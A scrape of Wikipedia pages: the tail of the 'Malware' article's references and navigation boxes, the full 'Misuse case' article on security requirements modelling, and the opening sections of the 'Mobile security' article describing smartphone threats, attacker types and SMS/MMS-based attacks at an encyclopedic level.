10.1145/2046707.2046779
. 
ISBN
 
978-1-4503-0948-6
. 
S2CID
 
895039
.




^
 
Wu, Sha; Liu, Jiajia (May 2019). 
"Overprivileged Permission Detection for Android Applications"
. 
ICC 2019 - 2019 IEEE International Conference on Communications (ICC)
. pp. 1–6. 
doi
:
10.1109/ICC.2019.8761572
. 
ISBN
 
978-1-5386-8088-9
. 
S2CID
 
198168673
. 
Archived
 from the original on 21 January 2022
. Retrieved 
1 January
 2022
.




^
 
"Malware, viruses, worms, Trojan horses and spyware"
. 
list.ercacinnican.tk
. 
Archived
 from the original on 5 February 2021
. Retrieved 
14 November
 2020
.




^
 
Mutch, John; Anderson, Brian (2011), Mutch, John; Anderson, Brian (eds.), 
"The Hard and Soft Cost of Apathy"
, 
Preventing Good People from doing Bad Things: Implementing Least Privilege
, Berkeley, CA: Apress, pp. 163–175, 
doi
:
10.1007/978-1-4302-3922-2_10
, 
ISBN
 
978-1-4302-3922-2
, 
archived
 from the original on 27 February 2023
, retrieved 
2 December
 2021




^
 
Singh, Vaishali; Pandey, S. K. (2021). 
"Revisiting Cloud Security Attacks: Credential Attack"
. In Rathore, Vijay Singh; Dey, Nilanjan; Piuri, Vincenzo; Babo, Rosalina; Polkowski, Zdzislaw; Tavares, João Manuel R. S. (eds.). 
Rising Threats in Expert Applications and Solutions
. Advances in Intelligent Systems and Computing. Vol. 1187. Singapore: Springer. pp. 339–350. 
doi
:
10.1007/978-981-15-6014-9_39
. 
ISBN
 
978-981-15-6014-9
. 
S2CID
 
224940546
. 
Archived
 from the original on 4 March 2022
. Retrieved 
2 December
 2021
.




^
 
"LNCS 3786 – Key Factors Influencing Worm Infection", U. Kanlayasiri, 2006, web (PDF): 
SL40-PDF
 
Archived
 27 February 2023 at the 
Wayback Machine
.




^
 
Cohen, Jason (28 August 2020). 
"Windows Computers Account for 83% of All Malware Attacks in Q1 2020"
. 
PCMag Australia
. 
Archived
 from the original on 2 December 2021
. Retrieved 
2 December
 2021
.




^
 
Wagner, Neal; Şahin, Cem Ş.; Winterrose, Michael; Riordan, James; Pena, Jaime; Hanson, Diana; Streilein, William W. (December 2016). 
"Towards automated cyber decision support: A case study on network segmentation for security"
. 
2016 IEEE Symposium Series on Computational Intelligence (SSCI)
. pp. 1–10. 
doi
:
10.1109/SSCI.2016.7849908
. 
ISBN
 
978-1-5090-4240-1
. 
S2CID
 
9065830
. 
Archived
 from the original on 2 December 2021
. Retrieved 
1 January
 2022
.




^
 
Hemberg, Erik; Zipkin, Joseph R.; Skowyra, Richard W.; Wagner, Neal; O'Reilly, Una-May (6 July 2018). 
"Adversarial co-evolution of attack and defense in a segmented computer network environment"
. 
Proceedings of the Genetic and Evolutionary Computation Conference Companion
. GECCO '18. New York, NY, USA: Association for Computing Machinery. pp. 1648–1655. 
doi
:
10.1145/3205651.3208287
. 
ISBN
 
978-1-4503-5764-7
. 
S2CID
 
51603533
.




^
 
"Malicious Software Removal Tool"
. Microsoft. Archived from 
the original
 on 21 June 2012
. Retrieved 
21 June
 2012
.




^ 
a
 
b
 
Rubenking, Neil J. (8 January 2014). 
"The Best Free Antivirus for 2014"
. pcmag.com. 
Archived
 from the original on 30 August 2017
. Retrieved 
4 September
 2017
.




^
 
"Free antivirus profiles in 2018"
. 
antivirusgratis.org
. 
Archived
 from the original on 10 August 2018
. Retrieved 
13 February
 2020
.




^
 
"Quickly identify malware running on your PC"
. 
techadvisor.co.uk
. Archived from 
the original
 on 2 September 2018
. Retrieved 
2 September
 2018
.




^
 
"How Antivirus Software Works?"
. 
Archived
 from the original on 12 January 2017
. Retrieved 
16 October
 2015
.




^ 
a
 
b
 
Souppaya, Murugiah; Scarfone, Karen (22 July 2013). 
Guide to Malware Incident Prevention and Handling for Desktops and Laptops
 (Report). National Institute of Standards and Technology.




^ 
a
 
b
 
c
 
"What is Browser Sandboxing?"
. 
GeeksforGeeks
. 19 February 2024. 
Archived
 from the original on 7 July 2024
. Retrieved 
7 July
 2024
.




^
 
Al-Saleh, Mohammed Ibrahim; Espinoza, Antonio M.; Crandall, Jedediah R. (2013). 
"Antivirus performance characterisation: system-wide view"
. 
IET Information Security
. 
7
 (2): 126–133. 
doi
:
10.1049/iet-ifs.2012.0192
. 
ISSN
 
1751-8717
.




^ 
a
 
b
 
"What is browser sandboxing? How to escape the sandbox?"
. 
misile00's personal website
. 15 June 2024. 
Archived
 from the original on 24 April 2024
. Retrieved 
7 July
 2024
.




^
 
Guri, Mordechai; Kedma, Gabi; Kachlon, Assaf; Elovici, Yuval (2014). "AirHopper: Bridging the air-gap between isolated networks and mobile phones using radio frequencies". 
2014 9th International Conference on Malicious and Unwanted Software: The Americas (MALWARE)
. IEEE. pp. 58–67. 
arXiv
:
1411.0237
. 
doi
:
10.1109/MALWARE.2014.6999418
. 
ISBN
 
978-1-4799-7329-3
.




^
 
Guri, Mordechai; Monitz, Matan; Mirski, Yisroel; Elovici, Yuval (2015). "BitWhisper: Covert Signaling Channel between Air-Gapped Computers Using Thermal Manipulations". 
2015 IEEE 28th Computer Security Foundations Symposium
. IEEE. pp. 276–289. 
arXiv
:
1503.07919
. 
doi
:
10.1109/CSF.2015.26
. 
ISBN
 
978-1-4673-7538-2
.




^
 
Guri, Mordechai; Kachlon, Assaf; Hasson, Ofer; Kedma, Gabi; Mirsky, Yisroel; Elovici, Yuval (2015). 
GSMem: Data Exfiltration from Air-Gapped Computers over GSM Frequencies
 
(PDF)
. USENIX Security Symposium. 
ISBN
 
978-1-939133-11-3
. 
Archived
 
(PDF)
 from the original on 1 March 2024.




^
 
Hanspach, Michael; Goetz, Michael; Daidakulov, Andrey; Elovici, Yuval (2016). "Fansmitter: Acoustic Data Exfiltration from (Speakerless) Air-Gapped Computers". 
arXiv
:
1606.05915
 [
cs.CR
].




^
 
Razak, Mohd Faizal Ab; Anuar, Nor Badrul; Salleh, Rosli; Firdaus, Ahmad (1 November 2016). 
"The rise of "malware": Bibliometric analysis of malware study"
. 
Journal of Network and Computer Applications
. 
75
: 58–76. 
doi
:
10.1016/j.jnca.2016.08.022
. 
ISSN
 
1084-8045
.






External links
[
edit
]








Look up 
malware
 in Wiktionary, the free dictionary.










Wikimedia Commons has media related to 
Malware
.




‹ The 
template
 below (
Curlie
) is being considered for deletion. See 
templates for discussion
 to help reach a consensus. ›
Malicious Software
 at 
Curlie


Further Reading: Research Papers and Documents about Malware on IDMARCH (Int. Digital Media Archive)


Advanced Malware Cleaning
 – a Microsoft video


v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




v
t
e
Software distribution
Licenses


Beerware


Floating licensing


Free and open-source


Free


Open source


Freely redistributable


License-free


Proprietary


Public domain


Source-available


Compensation models


Adware


Commercial software


Retail software


Crippleware


Crowdfunding


Freemium


Freeware


Pay what you want


Careware


Donationware


Open-core model


Postcardware


Shareware


Nagware


Trialware


Delivery methods


Digital distribution


File sharing


On-premises


Pre-installed


Product bundling


Retail software


Sneakernet


Software as a service


Deceptive and/or illicit


Unwanted software bundling


Malware


Infostealer


Ransomware


Spyware


Trojan horse


Worm


Scareware


Shovelware


Software release life cycle


Abandonware


End-of-life


Long-term support


Software maintenance


Software maintainer


Software publisher


Vaporware


list


Copy protection


Digital rights management


Software protection dongle


License manager


Product activation


Product key


Software copyright


Software license server


Software patent


Torrent poisoning




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation








Portal
:
 
Internet


Authority control databases
: National 
Germany
United States
Czech Republic
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Malware&oldid=1246818229
"


Categories
: 
Malware
Security breaches
Computer programming
Cybercrime
Hidden categories: 
Webarchive template wayback links
CS1: long volume value
Articles with short description
Short description is different from Wikidata
Use dmy dates from August 2017
All articles with unsourced statements
Articles with unsourced statements from July 2024
All articles with failed verification
Articles with failed verification from July 2024
Commons category link from Wikidata
Articles with Curlie links











From Wikipedia, the free encyclopedia






Example of the Misuse case principle, which could be used in thinking about capturing security requirements.


Misuse case
 is a 
business process modeling
 tool used in the software development industry. The term 
Misuse Case
 or 
mis-use case
 is derived from and is the inverse of 
use case
.
[
1
]
 The term was first used in the 1990s by Guttorm Sindre of the 
Norwegian University of Science and Technology
, and 
Andreas L. Opdahl
 of the 
University of Bergen
, Norway. It describes the process of executing a malicious act against a system, while  use case can be used to describe any action taken by the system.
[
2
]






Overview
[
edit
]


Use cases
 specify required behaviour of software and other products under development, and are essentially structured stories or 
scenarios
 detailing the normal behavior and usage of the software. A Misuse Case on the other hand highlights something that should not happen (i.e. a Negative Scenario) and the threats hence identified, help in defining new requirements, which are expressed as new Use Cases.

This modeling tool has several strengths:



It allows the provision of equal weightage to functional and non-functional requirements (e.g. security requirements, platform requirements, etc.), which may not be possible with other tools.


It emphasizes security from the beginning of the design process and helps to avoid hasty design decisions.


It is a tool for improving communication between developers and stakeholders and is valuable in ensuring that both agree on critical system solutions and Trade-off analysis.
[
3
]


Creating misuse cases often triggers a chain reaction which eases the identification of functional and non-functional requirements. The discovery of a misuse case will often lead to the creation of a new use case that acts as a counter measure. This in turn might be the subject of a new misuse case.
[
4
]


Compared to other tools, It relates better to use cases and 
UML
 and eases the seamless employment of the model.


Its biggest weakness is its simplicity. It needs to be combined with more powerful tools to establish an adequate plan for the execution of a project. One other weakness is its lack of structure and semantics.



From use to misuse case
[
edit
]


In an industry it is important to describe a system's behavior when it responds to a request that originates from outside : the use cases 
[
5
]
 have become popular for requirements 
[
1
]
 between the engineers thanks to its features like the visual modeling technique, they describe a system from an actor's viewpoint and its format explicitly conveys each actor's goals and the flows the system must implement to accomplish them.
[
6
]


The level of abstraction of a 
use case model
 makes it an appropriate starting point for design activities, thanks to the use of 
UML
 use case diagrams and the end user's or domain expert's language. But for software security analyses, the developers should pay attention to negative scenarios and understand them. That is why, in the 1990s, the concept of "inverse of a use case" was born in 
Norway
.

The contrast between the misuse case and the 
use case
 is the goal: the misuse case describes potential system behaviors that a system's stakeholders consider unacceptable or, as Guttorm Sindre and Andreas L. Opdahl said, "a function that the system should not allow".
[
1
]

This difference is also in the scenarios: a "positive" scenario is a sequence of actions leading to a Goal desired by a person or organization, while a "negative" one is a scenario whose goal is desired not to occur by the organization in question or desired by a hostile agent (not necessarily human).
[
7
]


Another description of the difference is by 
[
8
]
 that defines a use case as a completed sequence of actions which gives increased value to the user, one could define a misuse case as a completed sequence of actions which results in loss for the organization or some specific stakeholder.

Between the "good" and the "bad" case the language to represent the scenario is common: the use case diagrams are formally included in two modeling languages defined by the 
OMG
: the 
Unified Modeling Language
 (UML) and the 
Systems Modeling Language
 (SysML), and this use of drawing the agents and misuse cases of the scenario explicitly helps focus attention
on it.
[
9
]




Area of use
[
edit
]


Misuse case are most commonly used in the field of security.
[
10
]
 With the ever-growing importance of IT system, it has become vital for every company to develop capability to protect its data.
[
11
]


Hence, for example a misuse case might be used to define what a hacker would want to do with the system and define his or her requirements. A developer or designer can then define the requirements of the user and the hacker in the same UML diagram which in turn helps identify the security risks of the system.
[
12
]




Basic concepts
[
edit
]


A misuse case diagram is created together with a corresponding use case diagram. The model introduces 2 new important entities (in addition to those from the traditional use case model, 
use case
 and 
actor
:



Misuse case
 : A sequence of actions that can be performed by any person or entity in order to harm the system.


Misuser
 : The actor that initiates the misuse case. This can either be done intentionally or inadvertently.


Diagrams
[
edit
]


The misuse case model makes use of those relation types found in the use case model; 
include
, 
extend
, 
generalize
 and 
association
. In addition, it introduces two new relations to be used in the diagram:



mitigates


A use case can mitigate the chance that a misuse case will complete successfully.


threatens


A misuse case can threaten a use case, e.g. by exploiting it or hinder it from achieving its goals.


These new concepts together with the existing ones from use case give the following meta model, which is also found as fig. 2 in Sindre and Opdahl (2004).
[
2
]




Descriptions
[
edit
]


There are two different ways of describing a misuse case textual; one is embedded in a use case description template - where an extra description field called 
Threats
 can be added. This is the field where misuse case steps (and alternate steps) can be filled in. This is referred to as the 
lightweight
 mode of describing a misuse case.

The other way of describing a misuse case, is by using a separate template for this purpose only. It is suggested to inherit some of the field from use case description (
Name
, 
Summary
, 
Author
 and 
Date
). It also adapts the fields 
Basic path
 and 
Alternative path
, where they now describe the paths of the misuse cases instead of the use cases. In addition to there, it is proposed to use several other fields too:



Misuse case name


Summary


Author


Date


Basic path


Alternative paths


Mitigation points


Extension points


Triggers


Preconditions


Assumptions


Mitigation guarantee


Related business rules


Potential misuser profile


Stakeholders and threats


Terminology and explanations


Scope


Abstraction level


Precision level


As one might understand, the list above is too comprehensive to be completely filled out every time. Not all the fields are required to be filled in at the beginning, and it should thus be viewed as a living document. There has also been some debating whether to start with diagrams or to start with descriptions. The recommendation given by Sindre and Opdahl on that matter is that it should be done as with use cases.

Sindre and Opdahl proposes the following 5 steps for using misuse cases to identify security requirements:



Identify critical assets
 in the system


Define security goals
 for each assets


Identify threats
 to each of these security goals, by identifying the stakeholders that may want to cause harm to the system


Identify and analyze
 risks for the threats, using techniques like 
Risk Assessment


Define security requirements
 for the risks.


It is suggested to use a repository of reusable misuse cases as a support in this 5-step process.



Research
[
edit
]


Current field of research
[
edit
]


Current research on misuse cases are primarily focused on the security improvements they can bring to a project, software projects in particular. Ways to increase the widespread adoption of the practice of misuse case development during earlier phases of application development are being considered: the sooner a flaw is found, the easier it is to find a patch and the lower the impact is on the final cost of the project.

Other research focuses on improving the misuse case to achieve its final goal: for 
[
13
]
 "there is a lack on the application process, and the results are too general and can cause a under-definition or misinterpretation of their concepts". They suggest furthermore "to see the misuse case in the light of a reference model for 
information system security risk management
 (ISSRM)" to obtain a security risk management process.



Future improvement
[
edit
]


The misuse cases are well known by the population of researchers. The body of research on the subject demonstrate the knowledge, but beyond the academic world, the misuse case has not been broadly adopted.

As Sindre and Opdahl (the parents of the misuse case concept) suggest: "Another important goal for further work is to facilitate broader industrial adoption of misuse cases".
[
2
]
 They propose, in the same article, to embed the misuse case in a usecase modeling tool and to create a "database" of standard misuse cases to assist software architects. System stakeholders should create their own misuse case charts for requirements that are specific to their own problem domains. Once developed, a knowledge database can reduce the amount of standard security flaws used by lambda hackers.

Other research focused on possible missing concrete solutions of the misuse case: as 
[
14
]
 wrote "While this approach can help in a high level elicitation of security requirements, it does not show how to associate the misuse cases to legitimate behavior and concrete assets; therefore, it is not clear what misuse case should be considered, nor in what context". These criticisms might be addressed with the suggestions and improvements presented in the precedent section.

Standardization of the misuse case as part of the UML notation might allow it to become a mandatory part of project development. "It might be useful to create a specific notation for security functionality, or countermeasures that have been added to mitigate vulnerabilities and threats."
[
15
]




See also
[
edit
]


Use case diagram


Steps for Business Analyst To Gather Security Requirements from Misuse Cases 
[1]


Exception handling


Threat model
 (software)


References
[
edit
]






^ 
a
 
b
 
c
 
Sindre and Opdahl (2001). "
Capturing Security Requirements through Misuse Cases
"




^ 
a
 
b
 
c
 
Sindre and 
Opdahl
 (2004)."
Eliciting security requirements with misuse cases
 
Archived
 2011-07-16 at the 
Wayback Machine
"




^
 
Initial Industrial Experience of Misuse Cases in Trade-Off Analysis (2002, by Ian Alexander)
 
Archived
 2008-04-30 at the 
Wayback Machine




^
 
Ian Alexander, Misuse Cases: Use Cases with Hostile Intent. 
IEEE Software
, Vol 20, No 1, Jan-Feb 2003, 58-66. DOI: 10.1109/MS.2003.1159030




^
 
Jacobson, "Object-oriented software engineering: a use case driven approach", 1992 Addison-Wesley, Boston




^
 
Gunnar Peterson, John Steven "Defining Misuse within the Development Process", IEEE SECURITY & PRIVACY, NOVEMBER/DECEMBER 2006




^
 
Ian Alexander "Misuse case : use cases with hostile intent", presentation




^
 
Guttorm Sindre, Andreas L. Opdahl, "Templates for Misuse Case Description"




^
 
Ian Alexander "Misuse case : use cases with hostile intent"




^
 
Asoke K. Talukder; Manish Chaitanya (17 December 2008). 
Architecting Secure Software Systems
. CRC Press. p. 47. 
ISBN
 
978-1-4200-8784-0
. Retrieved 
5 October
 2016
.




^
 
Jesper M. Johansson; Steve Riley (27 May 2005). 
Protect Your Windows Network: From Perimeter To Data
. Addison-Wesley Professional. p. 
491
. 
ISBN
 
978-0-321-33643-9
. Retrieved 
5 October
 2016
.




^
 
Asoke K. Talukder; Manish Chaitanya (17 December 2008). 
Architecting Secure Software Systems
. CRC Press. p. 50. 
ISBN
 
978-1-4200-8784-0
. Retrieved 
5 October
 2016
.




^
 
Raimundas Matulevičius, Nicolas Mayer, Patrick Heymans, "Alignment of Misuse Cases with Security Risk Management"




^
 
Fabricio A. Braz, Eduardo B. Fernandez, Michael VanHilst, "Eliciting Security Requirements through Misuse Activities"




^
 
Lillian Røstad, "An extended misuse case notation: Including vulnerabilities and the insider threat"






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Misuse_case&oldid=1210394621
"


Categories
: 
Business process
Software project management
Software requirements
Hidden category: 
Webarchive template wayback links











From Wikipedia, the free encyclopedia






Security risk and prevention for mobile devices


This article is about security threats to mobile devices. For using mobile devices for secure system access, see 
Computer security § Hardware protection mechanisms
.


Mobile security
, or 
mobile device security
, is the protection of 
smartphones
, tablets, and 
laptops
 from threats associated with 
wireless computing
.
[
1
]
 It has become increasingly important in 
mobile computing
. The 
security
 of personal and business information now stored on 
smartphones
 is of particular concern.
[
2
]


Increasingly, users and businesses use smartphones not only to communicate, but also to plan and organize their work and private life. Within companies, these technologies are causing profound changes in the organization of 
information systems
 and have therefore become the source of new risks. Indeed, smartphones collect and compile an increasing amount of sensitive information to which access must be controlled to protect the 
privacy
 of the 
user
 and the 
intellectual property
 of the company.

The majority of attacks are aimed at smartphones.
[
citation needed
]
 These attacks take advantage of vulnerabilities discovered in smartphones that can result from different modes of communication, including 
Short Message Service
 (SMS, text messaging), 
Multimedia Messaging Service
 (MMS), 
wireless connections
, 
Bluetooth
, and 
GSM
, the de facto international standard for mobile communications. Smartphone operating systems or browsers are another weakness. Some 
malware
 makes use of the common user's limited knowledge. Only 2.1% of users reported having first-hand contact with 
mobile malware
, according to a 2008 McAfee study, which found that 11.6% of users had heard of someone else being harmed by the problem. Yet, it is predicted that this number will rise.
[
3
]


Security 
countermeasures
 are being developed and applied to smartphones, from security best practices in software to the dissemination of information to end users. Countermeasures can be implemented at all levels, including 
operating system
 development, software design, and user behavior modifications.





Challenges of smartphone mobile security
[
edit
]


Threats
[
edit
]


This section 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
 in this section. Unsourced material may be challenged and removed.
Find sources:
 
"Mobile security"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
October 2023
)
 (
Learn how and when to remove this message
)


A smartphone user is exposed to various threats when they use their phone. In just the last two quarters of 2012, the number of unique mobile threats grew by 261%, according to 
ABI Research
.
[
3
]
 These threats can disrupt the operation of the smartphone and transmit or modify user data. Applications must guarantee privacy and integrity of the information they handle. In addition, since some apps could themselves be malware, their functionality and activities should be limited (for example, restricting the apps from accessing location information via the 
Global Positioning System
 (GPS), blocking access to the user's address book, preventing the transmission of data on the network, or sending SMS messages that are billed to the user).
[
1
]
 Malicious apps can also be 
installed
 without the owners' permission or knowledge.

Vulnerability
 in mobile devices refers to aspects of system security that are susceptible to attacks. A vulnerability occurs when there is system weakness, an attacker has access to the weakness, and the attacker has competency to exploit the weakness.
[
1
]


Potential attackers began looking for vulnerabilities when Apple's 
iPhone
 and the first 
Android
 devices came onto the market. Since the introduction of apps (particularly mobile banking apps), which are vital targets for hackers, 
malware
 has been rampant. The Department of Homeland Security's 
cybersecurity
 department claims that the number of vulnerable points in smartphone operating systems has increased.
[
when?
]
 As mobile phones are connected to utilities and appliances, 
hackers
, 
cybercriminals
, and even intelligence officials have access to these devices.
[
4
]


Starting in 2011, it became increasingly popular to let employees use their own devices for work-related purposes. The Crowd Research Partners study, published in 2017, reports that during 2017, most businesses that mandated the use of mobile devices were subjected to malware attacks and breaches. It has become common for rogue applications to be installed on user devices without the user's permission. They breach privacy, which hinders the effectiveness of the devices.
[
citation needed
]
[
clarification needed
]


Since the recent rise of mobile attacks, hackers have increasingly targeted smartphones through credential theft and snooping. The number of attacks targeting smartphones and other devices has risen by 50 percent.
[
citation needed
]
 According to the study,
[
which?
]
 
mobile banking
 applications are responsible for the increase in attacks.

Malware—such as 
ransomware
, 
worms
, 
botnets
, 
Trojans
, and 
viruses
—have been developed to exploit vulnerabilities in mobile devices. Malware is distributed by attackers so they can gain access to private information or digitally harm a user. For example, should malware breach a user's banking service, it may be able to access their transaction information, their rights to 
log in
, and their money. Some malware is developed with anti-detection techniques to avoid detection. Attackers who use malware can avoid detection by hiding 
malicious code
.

Trojan-droppers can also avoid detection of malware. Despite the fact that the malware inside a device does not change, the dropper generates new 
hashes
 each time. Additionally, droppers can also create a multitude of files, which can lead to the creation of viruses. Android mobile devices are prone to Trojan-droppers. The banking Trojans also enable attacks on the banking applications on the phone, which leads to the theft of data for use in stealing money and funds.
[
clarification needed
]


Jailbreaks
 for 
iOS
 devices work by disabling the signing of codes on iPhones so that applications not downloaded from the App Store can be operated. In this way, all the protection layers offered by iOS are disrupted, exposing the device to malware. These outside applications don't run in a 
sandbox
, which exposes potential security problems. Some attack vectors change the mobile devices' configuration settings by installing malicious credentials and 
virtual private networks
 (VPNs) to direct information to malicious systems. In addition, 
spyware
 can be installed on mobile devices in order to track an individual.

Triade malware comes pre-installed on some mobile devices. In addition to Haddad, there is Lotoor, which exploits vulnerabilities in the system to repackage legitimate applications.
[
5
]
 The devices are also vulnerable due to spyware and leaky behaviors through applications. Mobile devices are also effective conveyance systems for malware threats, breaches of information, and thefts.

Wi-Fi interference technologies can also attack mobile devices through potentially insecure networks. By compromising the network, hackers are able to gain access to key data. Devices connected to public networks are at risk of attacks. A VPN, on the other hand, can be used to secure networks. As soon as a system is threatened, an active VPN will operate. There are also social engineering techniques, such as 
phishing
, in which unsuspecting victims are sent links to lead them to malicious websites. The attackers can then hack into the victim's device and copy all of its information.

Some mobile device attacks can be prevented. For example, containerization allows the creation of a hardware infrastructure that separates business data from other data. Additionally, network protection detects malicious traffic and rogue access points. Data security is also ensured through authentication.
[
1
]


There are a number of threats to mobile devices, including annoyance, stealing money, invading privacy, propagation, and malicious tools.
[
6
]
 There are three prime targets for attackers:
[
7
]




Data – Smartphones are devices for data management and may contain sensitive data like 
credit card
 numbers, authentication information, private information, activity logs (calendar, call logs).


Identity – Smartphones are highly customizable, so the device or its contents can easily be associated with a specific person.


Availability – Attacking a smartphone can limit or deprive a user's access to it.


Attacks on mobile security systems include:



Botnets
 – Attackers infect multiple machines with malware that victims generally acquire via e-mail attachments or from compromised applications or websites. The malware then gives hackers remote control of "zombie" devices, which can then be instructed to perform harmful acts.
[
6
]


Malicious applications – Hackers upload malicious programs or games to third-party smartphone application marketplaces. The programs steal personal information and open backdoor communication channels to install additional applications and cause other problems.
[
6
]


Malicious links on social networks – An effective way to spread malware where hackers can place Trojans, spyware, and backdoors.
[
6
]


Spyware
 – Hackers use this to hijack phones, allowing them to hear calls, see text messages and e-mails, and 
track a user's location
 through GPS updates.
[
6
]


The source of these attacks are the same actors found in the non-mobile computing space:
[
7
]




Professionals, whether commercial or military, who focus on the three targets mentioned above. They steal sensitive data from the general public, as well as undertake industrial 
espionage
. They will also use the identity of those attacked to achieve other attacks.


Thieves who want to gain income through data or identities they have stolen. The thieves will attack many people to increase their potential income.


Black hat hackers
 who specifically attack availability.
[
8
]
[
failed verification
]
 Their goal is to develop 
viruses
, and cause damage to the device.
[
9
]
[
failed verification
]
 In some cases, hackers have an interest in stealing data on devices.


Grey hat hackers
 who reveal vulnerabilities.
[
10
]
 Their goal is to expose vulnerabilities of the device.
[
11
]
 
Grey hat
 hackers do not intend on damaging the device or stealing data. 
[
12
]


Consequences
[
edit
]


When a smartphone is infected by an attacker, the attacker can attempt several things:



The attacker can manipulate the smartphone as a 
zombie machine
: a machine with which the attacker can communicate and send commands which will be used to send unsolicited messages (
spam
) via SMS or email.
[
13
]


The attacker can easily force the smartphone to make phone calls. For example, one can use the 
API
 (library that contains the basic functions not present in the smartphone) PhoneMakeCall by 
Microsoft
, which collects telephone numbers from any source (such as 
yellow pages
) and then calls them.
[
13
]
 The attacker can use this method to call paid services, resulting in charges to the smartphone owner. Dangerously, the smartphone could call and disrupt 
emergency services
.
[
13
]


A compromised smartphone can record conversations between the user and others and send them to a third party.
[
13
]
 This can cause user privacy and industrial security problems.


An attacker can also steal a user's identity, usurp their identity (with a copy of the user's 
SIM
 card or even the telephone itself), and thus impersonate the owner. This raises security concerns in countries where smartphones can be used to place orders, view bank accounts, or are used as an identity card.
[
13
]


The attacker can reduce the usability of the smartphone, by discharging the battery.
[
14
]
 For example, they can launch an application that will run continuously on the smartphone processor, requiring a lot of energy and draining the battery. Frank Stajano and Ross Anderson first described this form of attack, calling it an attack of "battery exhaustion" or "sleep deprivation torture".
[
15
]


The attacker can make the smartphone unusable.
[
16
]
 This attack can delete the boot scripts, resulting in a phone without a functioning 
operating system
; modify certain files to make it unusable, such as a script that launches at startup that forces the smartphone to restart; or embed a startup application that will empty the battery.
[
15
]


The attacker can remove the user's data, whether personal (photos, music, videos) or professional (contacts, calendars, notes).
[
16
]


Attacks based on communication
[
edit
]


Attacks based on SMS and MMS
[
edit
]


Some attacks derive from flaws in the management of 
Short Message Service
 (SMS) and 
Multimedia Messaging Service
 (MMS).

Some mobile phone models have problems in managing 
binary
 SMS messages. By sending an ill-formed block, it is possible to cause the phone to restart, leading to the denial-of-service attacks. If a user with a 
Siemens S55
 received a text message containing a 
Chinese character
, it would lead to a denial of service.
[
17
]

In another case, while the standard requires that the maximum size of a Nokia Mail address is 32 characters, some 
Nokia
 phones did not verify this standard, so if a user enters an email address over 32 characters, that leads to complete dysfunction of the e-mail handler and puts it out of commission. This attack is called "curse of silence".
A study on the safety of the SMS infrastructure revealed that SMS messages sent from the 
Internet
 can be used to perform a 
distributed denial of service
 (DDoS) attack against the 
mobile telecommunications
 infrastructure of a big city. The attack exploits the delays in the delivery of messages to overload the network.

Another potential attack could begin with a phone that sends an MMS to other phones, with an attachment. This attachment is infected with a virus. Upon receipt of the MMS, the user can choose to open the attachment. If it is opened, the phone is infected, and the virus sends an MMS with an infected attachment to all the contacts in the address book. There is a real-world example of this attack: the virus 
Commwarrior
[
16
]
 sends MMS messages (including an infected file) to all recipients in a mobile phone's address book. If a recipient installs the infected file, the virus repeats, sending messages to recipients taken from the new address book.



